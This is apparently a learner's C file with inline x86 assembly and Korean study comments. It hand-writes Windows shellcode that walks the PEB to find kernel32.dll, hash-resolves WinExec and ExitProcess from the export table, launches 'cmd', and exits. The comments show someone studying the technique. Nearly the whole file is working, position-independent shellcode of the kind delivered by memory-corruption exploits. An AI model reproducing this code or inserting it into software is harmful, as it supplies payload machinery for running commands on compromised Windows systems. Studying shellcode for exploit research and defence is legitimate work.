void main()
{
    __asm{
        jmp start // start로 간다

        get_func_addr:
            //name table index를 구함
        loop_ent:
            inc edx //index++
            lodsd   // eax = *esi, esi +=4 
            pushad
            add ebx, eax
            mov esi, ebx
            xor eax, eax
            xor edi, edi

        hash:
            lodsb //eax = *esi, esi += 1
            add edi, eax // edi += char
            test al, al
            jnz hash
            mov [ebp+0x10], edi
            popad
            cmp [ebp+0x10], edi
            jne loop_ent
            //get WinExec address
            movzx edx, word ptr [ecx+edx*2-2] //Ordinal
            mov edi, [ebp+0x18]
            mov esi, [edi+0x1c]
            mov edi, ebx
            add esi, edi
            add edi, [esi+edx*4]
            mov eax, edi
            //edi = 함수주소 리턴
            ret
        
        start:
            //cmd 문자열
            xor eax, eax        // eax 0으로 초기화
            mov [ebp+0xf], eax  // 0xc가아니라 0xf아닌가
            mov [ebp+0xc], 0x63 // 'c'
            mov [ebp+0xd], 0x6d // 'm'
            mov [ebp+0xe], 0x64 // 'd'

            //kernel32.dll base address 구함
            // peb = fs + 0x30 : fs레지스터에 TEB있으니깐 여기서 0x30가면 peb의 주소가 있따.
            // peb_ldr_data = *(peb + 0xc) : peb주소에서 0xc오프셋 떨어진 거리에 peb_ldr_data 주소가 있다.
            // list = *(peb_ldr_data + 0x14) : peb_ldr_data 주소에서 0x14 오프셋 떨어진 거리에 exe의 InMemoryOrderModuleList 주소가 있다
            // ntdll_link = *(list) : InMemoryOrderModuleList가 가진 주소에 ntdll.dll의 주소는 아니고 다음 InMemoryOrderLinks를 가르키는 InMemoryOrderLinks가 있다.
            // kernel32_link = *(ntdll_link) : ntdll_link가 가진 주소에 kernel32.dll의 주소는 아니고 다음 InMemoryOrderLinks를 가르키는 InMemoryOrderLinks가 있다.
            // ebx = *(ebx + 0x10) : kernel32_link의 주소에서 0x10 떨어진 거리에 kernel32.dll의 주소가 있다.
            mov eax, fs:[0x30] // PEB
            mov eax, [eax+0xc] // PEB_LDR_DATA
            mov eax, [eax+0x14] // .exe InMemoryOrderModuleList
            mov ebx, [eax] //ntdll.dll InMemoryOrderLinks
            mov ebx, [ebx] //kernel32.dll InMemoryOrderLinks
            mov ebx, [ebx+0x10] // ebx = kernel32.dll base address

            //export table
            // offset_to_new_exe_header = *(ebx+0x3c) : kernel32.dll의 0x3c 오프셋을 더하면 offset_to_new_exe_header의 오프셋이 나옴. (0x3c의 오프셋이 offset_to_new_exe_header이다.)
            // nt_header_addr = offset_to_new_exe_header + kernel32_base
            // export_table_offset = nt_header_addr + 0x78 (0x60(offset_data_directories) + 0x18(offset_export_table))
            // export_table_addr(edi) = export_table_offset + kernel32.dll_base
            // *(ebp + 0x18) = export_table_addr : ?? 이거 왜함? "나중에 함수명 해쉬 값 연산시 다시 사용하기 위해서"
            // export_name_table_offset(esi) = *(export_table_addr(edi) + 0x20)
            // export_name_table_addr(esi) = export_name_table_offset(esi) + kernel32_base(ebx)
            // export_ordinal_table_offset(ecx) = *(export_table_addr(edi) + 0x24)
            // export_ordinal_table_addr(ecx) = export_ordinal_table_offset(ecx) + kernel32_base(ebx)
            // edx = 0
            // pushad :???????
            mov edi, [ebx+0x3c] // PE header
            add edi, ebx 
            mov edi, [edi+0x78]
            add edi, ebx
            mov [ebp+0x18], edi // Export Directory
            mov esi, [edi+0x20] //Export Name table
            add esi, ebx
            mov ecx, [edi+0x24] //Ordinal table
            add ecx, ebx //ecx = Ordinal table
            xor edx, edx
            pushad

            //WinExec 함수주소 구함
            // edi = 0    : ??
            // di = 0x2b3 : ?? 0x2b3을 왜하는거지 "이 값은 구하려는 WinExec의 해쉬값(정확히는 함수명을 구분하기 위한 단순 연산 값)"
            // call_get_func_addr : 

            xor edi, edi
            mov di, 0x2b3
            call get_func_addr
            mov [ebp+0x20], eax
            popad

            //ExitProcess 함수 주소 구함
            // di = 0x479 : 0x2b3을 왜하는거지 "이 값은 구하려는 WinExec의 해쉬값(정확히는 함수명을 구분하기 위한 단순 연산 값)"
            xor edi, edi
            add di, 0x479
            call get_func_addr
            mov [ebp+0x24], eax

            //WinExec 실행
            xor eax, eax //eax = 0
            push eax
            lea eax, [ebp+0xc] //cmd
            push eax
            call [ebp+0x20] //WinExec('cmd', 0)

            //ExitProcess 실행
            xor eax, eax
            push eax
            call [ebp + 0x24] //ExitProcess

    }
}